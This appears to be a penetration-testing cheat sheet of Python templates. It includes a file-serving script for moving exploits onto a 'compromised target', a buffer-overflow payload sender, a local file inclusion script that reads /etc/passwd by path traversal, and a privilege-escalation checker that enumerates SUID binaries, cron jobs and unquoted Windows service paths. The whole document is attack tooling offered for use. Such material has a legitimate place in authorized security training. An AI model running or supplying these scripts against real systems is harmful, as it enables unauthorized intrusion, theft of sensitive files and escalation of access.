# a. Simple HTTP Server for File Transfer
# Use this to host files (e.g., exploits, tools) on your local machine and download them to a compromised target:

import http.server
import socketserver

PORT = 8000
Handler = http.server.SimpleHTTPRequestHandler

with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print(f"Serving files on port {PORT}")
    httpd.serve_forever()
# Usage: Run python3 server.py and access files via http://<YOUR_IP>:8000/file.exe.

# b. Buffer Overflow Skeleton (for Exploit Development)
# Template for fuzzing and sending payloads to vulnerable applications:

import socket

target_ip = "10.10.10.10"
target_port = 1337
offset = 100  # Adjust based on EIP overwrite
payload = b"A" * offset + b"B" * 4  # Replace with your payload

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    s.send(payload)
    print("Payload sent!")
except Exception as e:
    print(f"Error: {e}")
finally:
    s.close()

# c. Local File Inclusion (LFI) Exploiter
# Automate LFI vulnerabilities to read sensitive files (e.g., /etc/passwd):

import requests

url = "http://10.10.10.10/lfi.php?file="
file_to_read = "../../../../etc/passwd"

response = requests.get(url + file_to_read)
if response.status_code == 200:
    print(response.text)
else:
    print("Failed to read file.")

# d. Privilege Escalation Checker
# Identify common misconfigurations for Linux/Windows privilege escalation:

import os
import platform

def check_linux_esc():
    # Check SUID binaries
    os.system("find / -perm -4000 2>/dev/null")
    # Check writable cron jobs
    os.system("ls -la /etc/cron*")

def check_windows_esc():
    # Check unquoted service paths
    os.system('wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\"')

if platform.system() == "Linux":
    check_linux_esc()
else:
    check_windows_esc()